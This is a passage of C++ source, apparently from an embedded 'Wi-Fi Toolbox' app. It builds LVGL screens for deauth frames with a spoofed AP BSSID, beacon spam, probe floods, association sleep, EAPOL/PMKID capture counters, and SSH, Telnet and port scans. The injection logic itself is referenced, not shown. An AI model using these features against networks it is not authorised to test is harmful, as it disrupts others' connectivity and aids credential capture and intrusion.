    uint32_t index = lv_dropdown_get_selected(dropdown);
    ctx->lockChannel = (index == 0) ? 0 : kChannels[index - 1];
    if (ctx->wifi != nullptr && ctx->lockChannel != 0) {
        wifi_set_channel(ctx->wifi, ctx->lockChannel);
    }
}

static void onInjectClientMacChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* ta = static_cast<lv_obj_t*>(lv_event_get_target(event));
    std::strncpy(ctx->deauthClientText, lv_textarea_get_text(ta), sizeof(ctx->deauthClientText) - 1);
    ctx->deauthClientText[sizeof(ctx->deauthClientText) - 1] = '\0';
    ctx->deauthClientKnown = parseMac(ctx->deauthClientText, ctx->deauthClient);
}

static void showInjectScreen(Context* ctx) {
    bool isDeauth = (ctx->injectMode == InjectMode::Deauth);
    const char* modeText = ctx->injectMode == InjectMode::Beacon ? "Beacon Spam"
        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood"
        : (ctx->injectMode == InjectMode::Deauth ? "Deauth" : "Association Sleep"));
    auto* label = lv_label_create(ctx->body);
    lv_label_set_text(label, modeText);

    // SSID input for beacon/probe only; deauth/sleep don't use it.
    if (ctx->injectMode != InjectMode::Deauth && ctx->injectMode != InjectMode::Sleep) {
        auto* ssidTextarea = lv_textarea_create(ctx->body);
        lv_textarea_set_placeholder_text(ssidTextarea, "SSID (blank = Funny list for beacon)");
        lv_textarea_set_one_line(ssidTextarea, true);
        lv_textarea_set_accepted_chars(ssidTextarea, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _-.,:()[]!?*");
        lv_obj_set_width(ssidTextarea, LV_PCT(100));
        lv_obj_add_event_cb(ssidTextarea, onInjectSsidChanged, LV_EVENT_VALUE_CHANGED, ctx);
    }

    // AP BSSID spoofed as the frame source for deauth/sleep.
    auto* bssidTextarea = lv_textarea_create(ctx->body);
    lv_textarea_set_placeholder_text(bssidTextarea, "AP BSSID to spoof (aa:bb:cc:dd:ee:ff)");
    lv_textarea_set_one_line(bssidTextarea, true);
    lv_textarea_set_accepted_chars(bssidTextarea, "0123456789abcdefABCDEF:");
    lv_obj_set_width(bssidTextarea, LV_PCT(100));
    lv_obj_add_event_cb(bssidTextarea, onInjectBssidChanged, LV_EVENT_VALUE_CHANGED, ctx);

    if (isDeauth) {
        auto* clientTextarea = lv_textarea_create(ctx->body);
        lv_textarea_set_placeholder_text(clientTextarea, "Client MAC to deauth (blank = broadcast all)");
        lv_textarea_set_one_line(clientTextarea, true);
        lv_textarea_set_accepted_chars(clientTextarea, "0123456789abcdefABCDEF:");
        lv_obj_set_width(clientTextarea, LV_PCT(100));
        lv_obj_add_event_cb(clientTextarea, onInjectClientMacChanged, LV_EVENT_VALUE_CHANGED, ctx);
    }

    // Channel selector.
    auto* channelDropdown = lv_dropdown_create(ctx->body);
    std::string channelOptions = "Auto";
    for (uint8_t ch : kChannels) channelOptions += "\n" + std::to_string(ch);
    lv_dropdown_set_options(channelDropdown, channelOptions.c_str());
    lv_dropdown_set_selected(channelDropdown, 0);
    lv_obj_set_width(channelDropdown, LV_PCT(100));
    lv_obj_add_event_cb(channelDropdown, onInjectChannelChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* button = lv_button_create(ctx->body);
    lv_obj_set_width(button, LV_PCT(100));
    ctx->startButtonLabel = lv_label_create(button);
    lv_label_set_text(ctx->startButtonLabel, "Start");
    lv_obj_center(ctx->startButtonLabel);
    lv_obj_add_event_cb(button, onInjectStartStop, LV_EVENT_SHORT_CLICKED, ctx);
}

// ---- Network screen ----
static void onNetStart(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    ensureWifiOn();
    startNetScan(ctx, ctx->netMode, ctx->netSinglePort, ctx->netPreset);
#endif
}

static void onNetModeChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* dd = static_cast<lv_obj_t*>(lv_event_get_target(event));
    uint32_t idx = lv_dropdown_get_selected(dd);
    ctx->netMode = (idx == 0) ? NetMode::Host : (idx == 1) ? NetMode::Ssh : (idx == 2) ? NetMode::Telnet : NetMode::Port;
}

static void onNetPresetChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* dd = static_cast<lv_obj_t*>(lv_event_get_target(event));
    ctx->netPreset = static_cast<uint16_t>(lv_dropdown_get_selected(dd));
}

static void onNetTargetChanged(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    auto* ta = static_cast<lv_obj_t*>(lv_event_get_target(event));
    struct in_addr a {};
    if (inet_pton(AF_INET, lv_textarea_get_text(ta), &a) == 1) {
        ctx->netTargetOverrideAddr = a.s_addr;
        ctx->netTargetOverride = true;
    } else {
        ctx->netTargetOverride = false;
    }
}

static void showNetworkScreen(Context* ctx) {
    auto* label = lv_label_create(ctx->body);
    lv_label_set_text(label, "WiFi + Net utilities (needs a connection).");

    auto* modeDropdown = lv_dropdown_create(ctx->body);
    lv_dropdown_set_options(modeDropdown, "ARP / Host scan\nSSH scan (22)\nTelnet scan (23)\nPort scan (preset)");
    lv_dropdown_set_selected(modeDropdown, 0);
    lv_obj_set_width(modeDropdown, LV_PCT(100));
    lv_obj_add_event_cb(modeDropdown, onNetModeChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* presetDropdown = lv_dropdown_create(ctx->body);
    std::string presets;
    for (const auto& p : kPortPresets) {
        presets += p.name;
        presets += "\n";
    }
    lv_dropdown_set_options(presetDropdown, presets.c_str());
    lv_dropdown_set_selected(presetDropdown, 0);
    lv_obj_set_width(presetDropdown, LV_PCT(100));
    lv_obj_add_event_cb(presetDropdown, onNetPresetChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* targetTextarea = lv_textarea_create(ctx->body);
    lv_textarea_set_placeholder_text(targetTextarea, "Port-scan target IP (blank = this device)");
    lv_textarea_set_one_line(targetTextarea, true);
    lv_textarea_set_accepted_chars(targetTextarea, "0123456789.");
    lv_obj_set_width(targetTextarea, LV_PCT(100));
    lv_obj_add_event_cb(targetTextarea, onNetTargetChanged, LV_EVENT_VALUE_CHANGED, ctx);

    auto* button = lv_button_create(ctx->body);
    lv_obj_set_width(button, LV_PCT(100));
    ctx->startButtonLabel = lv_label_create(button);
    lv_label_set_text(ctx->startButtonLabel, "Scan");
    lv_obj_center(ctx->startButtonLabel);
    lv_obj_add_event_cb(button, onNetStart, LV_EVENT_SHORT_CLICKED, ctx);

    ctx->resultLabel = lv_label_create(ctx->body);
    lv_label_set_text(ctx->resultLabel, "Idle");
}

// -----------------------------------------------------------------------------
// Polling
// -----------------------------------------------------------------------------
static void onPollTick(Context* ctx) {
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    // Update capture/inject stats.
    if (ctx->statsLabel != nullptr) {
        std::string text;
        if (ctx->injecting) {
            text = std::format("Injecting... Ch:{}", (unsigned)ctx->currentChannel.load());
        } else {
            text = std::format("Pkts:{} EAPOL:{} PMKID:{} Deauth:{} Dropped:{} KB:{} Ch:{}",
                (unsigned)ctx->packetCount.load(),
                (unsigned)ctx->eapolCount.load(),
                (unsigned)ctx->pmkidCount.load(),
                (unsigned)ctx->deauthCount.load(),
                (unsigned)ctx->droppedCount.load(),
                (unsigned)(ctx->writer.getBytesWritten() / 1024),
                (unsigned)ctx->currentChannel.load());
        }
        lv_label_set_text(ctx->statsLabel, text.c_str());
    }
    if (ctx->statusLabel != nullptr) {
        const char* txt = ctx->injecting ? "Injecting"
            : (ctx->writerThread != nullptr ? "Capturing" : "Stopped");
        lv_label_set_text(ctx->statusLabel, txt);
    }
    if (ctx->startButtonLabel != nullptr) {
        bool active = ctx->injecting || ctx->writerThread != nullptr;
        lv_label_set_text(ctx->startButtonLabel, active ? "Stop" : "Start");
    }

    // Publish network scan results once complete.
    if (ctx->netRunning.load() == false && ctx->netDone && ctx->resultLabel != nullptr) {
        std::string text = std::format("{}found {}\n{}", "",
            (unsigned)ctx->netFound.load(), ctx->netResult);
        lv_label_set_text(ctx->resultLabel, text.c_str());
        ctx->netDone = false;
    }
#endif
}

// -----------------------------------------------------------------------------
// App entry
// -----------------------------------------------------------------------------
void createWidgets(lv_obj_t* parent, void* userData) {
    auto* ctx = static_cast<Context*>(userData);
    lv_obj_set_flex_flow(parent, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(parent, 0, LV_STATE_DEFAULT);

    auto* toolbar = lvgl_toolbar_create(parent, "Wi-Fi Toolbox");
    lvgl_toolbar_set_nav_action(toolbar, LV_SYMBOL_CLOSE, onBackPressed, ctx);

    ctx->body = lv_obj_create(parent);
    lv_obj_set_width(ctx->body, LV_PCT(100));
    lv_obj_set_flex_grow(ctx->body, 1);
    lv_obj_set_flex_flow(ctx->body, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_all(ctx->body, 8, LV_STATE_DEFAULT);
    lv_obj_set_style_pad_column(ctx->body, 6, LV_STATE_DEFAULT);
    // Make the body scrollable so all menu entries are reachable on the small screen.
    lv_obj_set_scroll_dir(ctx->body, LV_DIR_VER);
    lv_obj_scroll_to_y(ctx->body, 0, LV_ANIM_OFF);

    showMainScreen(ctx);
}

int32_t appMain(int argc, char* argv[]) {
    uint32_t appInstanceId = app_scheduler_current_app_id();
    Context ctx;
    ctx.appInstanceId = appInstanceId;

#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    ctx.streamBufferStorage = static_cast<uint8_t*>(heap_caps_malloc(STREAM_BUFFER_SIZE, MALLOC_CAP_SPIRAM));
    if (ctx.streamBufferStorage != nullptr) {
        ctx.streamBuffer = xStreamBufferCreateStatic(STREAM_BUFFER_SIZE, 1, ctx.streamBufferStorage, &s_streamBufferStruct);
    }
#endif

    ctx.pollTimer = std::make_unique<Timer>(Timer::Type::Periodic, millis_to_ticks(POLL_INTERVAL_MS), [&ctx] {
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
        onPollTick(&ctx);
#endif
    });
    ctx.injectTimer = std::make_unique<Timer>(Timer::Type::Periodic, millis_to_ticks(INJECT_INTERVAL_MS), [&ctx] {
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
        onInjectTick(&ctx);
#endif
    });

    TaskEventGroup event_group;
    task_event_group_construct(&event_group);
    AppEventSubscription sub{};
    app_event_subscribe(&sub, &event_group);

    WindowId window = window_manager_create(appInstanceId, createWidgets, &ctx);
    ctx.pollTimer->start();

    bool shouldClose = false;
    while (!shouldClose) {
        task_event_group_wait_any(&event_group, nullptr, portMAX_DELAY);
        AppEvent event{};
        while (app_event_poll(&sub, &event) == ERROR_NONE) {
            if (event.type == APP_EVENT_CLOSE) {
#if defined(CONFIG_SOC_WIFI_SUPPORTED)
                ctx.injecting = false;
                ctx.injectTimer->stop();
                ctx.writerStop = true;
                stopCapture(&ctx);
#endif
                shouldClose = true;
                break;
            }
        }
    }

    ctx.pollTimer->stop();
    window_manager_remove(window);
    app_event_unsubscribe(&sub);
    task_event_group_destruct(&event_group);

#if defined(CONFIG_SOC_WIFI_SUPPORTED)
    if (ctx.streamBufferStorage != nullptr) {
        heap_caps_free(ctx.streamBufferStorage);
        ctx.streamBufferStorage = nullptr;
        ctx.streamBuffer = nullptr;
    }
#endif
    return 0;
}

} // namespace

uint32_t start() {
    uint32_t instanceId = 0;
    app_start(manifest.id, 0, nullptr, &instanceId);
    return instanceId;
}

extern const ::AppManifest manifest = {
    .id = "WifiToolbox",
    .name = "Wi-Fi Toolbox",
    .category = APP_CATEGORY_USER,
    .location = { APP_LOCATION_MEMORY, reinterpret_cast<void*>(appMain) },
    .flags = 0,
    .stack = {}
};

} // namespace tt::app::wifitoolbox
